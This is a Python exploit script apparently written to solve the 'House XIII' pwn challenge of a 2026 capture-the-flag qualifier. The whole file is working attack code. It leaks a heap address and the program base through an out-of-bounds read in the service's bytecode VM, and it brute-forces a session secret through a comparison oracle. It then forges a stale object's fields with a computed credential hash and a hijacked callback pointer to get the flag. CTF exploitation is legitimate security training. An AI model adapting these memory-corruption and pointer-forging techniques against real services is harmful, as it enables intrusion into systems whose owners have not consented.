#!/usr/bin/env python3
"""Remote exploit for z0d1akCTF 2026 Qualifiers: House XIII."""

from __future__ import annotations

import argparse
import re
import socket
import ssl
import struct
import sys
from pathlib import Path


DEFAULT_HOST = "house-xiii-d549d5450132.chals.z0d1ak.org"
DEFAULT_PORT = 1337
MASK64 = (1 << 64) - 1
FLAG_PATTERN = re.compile(rb"zdk\{[^}\r\n]+\}")


def rol64(value: int, count: int) -> int:
    return ((value << count) | (value >> (64 - count))) & MASK64


def ror64(value: int, count: int) -> int:
    return ((value >> count) | (value << (64 - count))) & MASK64


def mix64(value: int) -> int:
    value &= MASK64
    value ^= value >> 30
    value = value * 0xBF58476D1CE4E5B9 & MASK64
    value ^= value >> 27
    value = value * 0x94D049BB133111EB & MASK64
    value ^= value >> 31
    return value & MASK64


def credential_hash(encoded: int, relation: int, obj: int, secret: int) -> int:
    """Reproduce the credential calculation at transit+0x1f40."""
    pointer_lane = (
        rol64(secret, 29) + 0xD1A613C0DEC0FFEE + encoded
    ) & MASK64
    relation_lane = (
        ror64(secret, 11) + 0x13F0A5B7C9E2468D + relation
    ) & MASK64
    object_lane = (
        0xA57EA1C49D2036BF + rol64(secret, 7) + obj
    ) & MASK64

    combined = encoded * 0x9E3779B185EBCA87 & MASK64
    combined ^= mix64(pointer_lane)
    combined ^= ror64(mix64(object_lane), 9)
    combined ^= rol64(mix64(relation_lane), 23)
    return mix64(combined)


class Tube:
    def __init__(self, sock: ssl.SSLSocket) -> None:
        self.sock = sock
        self.buffer = bytearray()

    def recvuntil(self, marker: bytes) -> bytes:
        while marker not in self.buffer:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError(f"connection closed while waiting for {marker!r}")
            self.buffer.extend(chunk)

        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def sendline(self, value: object) -> None:
        self.sock.sendall(str(value).encode() + b"\n")


def create_star(tube: Tube) -> None:
    tube.sendline(1)
    tube.recvuntil(b"id: ")
    tube.sendline(0)
    tube.recvuntil(b"control> ")


def build_leak_bytecode() -> bytes:
    # VM data normally starts at object+0x60. Opcode 0x19 accepts a signed
    # cursor change, so -0x50 moves the effective read address to object+0x10.
    bytecode = bytearray([0x19, 0xB0])
    for index in range(16):
        bytecode.append(0x2D)
        if index != 15:
            bytecode.extend((0x19, 0x01))
    return bytes(bytecode)


def leak_metadata(tube: Tube, bytecode: bytes) -> tuple[int, int]:

    tube.sendline(3)
    tube.recvuntil(b"id: ")
    tube.sendline(0)
    tube.recvuntil(b"blob: ")
    tube.sendline(bytecode.hex())
    tube.recvuntil(b"control> ")

    tube.sendline(4)
    tube.recvuntil(b"id: ")
    tube.sendline(0)
    response = tube.recvuntil(b"control> ")

    match = re.search(rb"result:([0-9a-f]{32})", response)
    if not match:
        raise RuntimeError("the VM metadata leak was not present")

    obj, destructor = struct.unpack("<QQ", bytes.fromhex(match.group(1).decode()))
    pie_base = destructor - 0x2060
    return obj, pie_base


def convert_to_orbital(tube: Tube) -> None:
    tube.sendline(5)
    tube.recvuntil(b"id-a: ")
    tube.sendline(0)
    tube.recvuntil(b"id-b: ")
    tube.sendline(0)
    tube.recvuntil(b"control> ")


def recover_secret(tube: Tube) -> int:
    low, high = 0, MASK64

    while low < high:
        candidate = (low + high) // 2
        tube.sendline(6)
        tube.recvuntil(b"id: ")
        tube.sendline(0)
        tube.recvuntil(b"value: ")
        tube.sendline(candidate)
        response = tube.recvuntil(b"control> ")

        match = re.search(rb"status:([0-9a-f]{2})", response)
        if not match:
            raise RuntimeError("the comparison oracle returned no status")

        status = int(match.group(1), 16)
        if status == 0x31:
            low = candidate + 1
        elif status == 0x73:
            high = candidate
        else:
            raise RuntimeError(f"unexpected oracle status: {status:#x}")

    return low


def forge_orbital(
    tube: Tube, obj: int, pie_base: int, secret: int
) -> tuple[int, int, bytes]:
    relation = 0x1201 ^ 0x1202
    sendfile_slot = pie_base + 0x4CF0
    encoded_callback = rol64(sendfile_slot ^ secret, 17)
    auth = credential_hash(encoded_callback, relation, obj, secret)

    # The stale Star entry lets control 2 overwrite Orbital fields +0x60..+0x87.
    # Both the source descriptor and the House marker are set to XIII (13).
    forged_fields = struct.pack(
        "<QQQIIQ",
        encoded_callback,
        auth,
        0,
        13,
        13,
        relation,
    )

    tube.sendline(2)
    tube.recvuntil(b"id: ")
    tube.sendline(0)
    tube.recvuntil(b"pos: ")
    tube.sendline(0)
    tube.recvuntil(b"blob: ")
    tube.sendline(forged_fields.hex())
    tube.recvuntil(b"control> ")
    return encoded_callback, auth, forged_fields


def trigger(tube: Tube) -> bytes:
    tube.sendline(7)
    tube.recvuntil(b"id: ")
    tube.sendline(0)
    return tube.recvuntil(b"control> ")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument(
        "--dump-dir",
        type=Path,
        help="write the VM bytecode and session-specific forged fields",
    )
    args = parser.parse_args()

    context = ssl.create_default_context()
    bytecode = build_leak_bytecode()

    with socket.create_connection(
        (args.host, args.port), timeout=args.timeout
    ) as raw_socket:
        with context.wrap_socket(
            raw_socket, server_hostname=args.host
        ) as tls_socket:
            tls_socket.settimeout(args.timeout)
            tube = Tube(tls_socket)
            tube.recvuntil(b"control> ")

            create_star(tube)
            obj, pie_base = leak_metadata(tube, bytecode)
            convert_to_orbital(tube)
            secret = recover_secret(tube)
            encoded, auth, forged_fields = forge_orbital(
                tube, obj, pie_base, secret
            )
            response = trigger(tube)

    if args.dump_dir:
        args.dump_dir.mkdir(parents=True, exist_ok=True)
        (args.dump_dir / "vm-leak-bytecode.bin").write_bytes(bytecode)
        (args.dump_dir / "forged-orbital.bin").write_bytes(forged_fields)

    if args.verbose:
        print(f"[+] heap object:       {obj:#018x}")
        print(f"[+] PIE base:          {pie_base:#018x}")
        print(f"[+] session secret:    {secret:#018x}")
        print(f"[+] encoded callback:  {encoded:#018x}")
        print(f"[+] credential hash:   {auth:#018x}")

    match = FLAG_PATTERN.search(response)
    if not match:
        sys.stderr.write(response.decode(errors="replace"))
        sys.stderr.write("\nThe real flag was not present in the final response.\n")
        return 1

    print(f"[+] flag: {match.group().decode()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
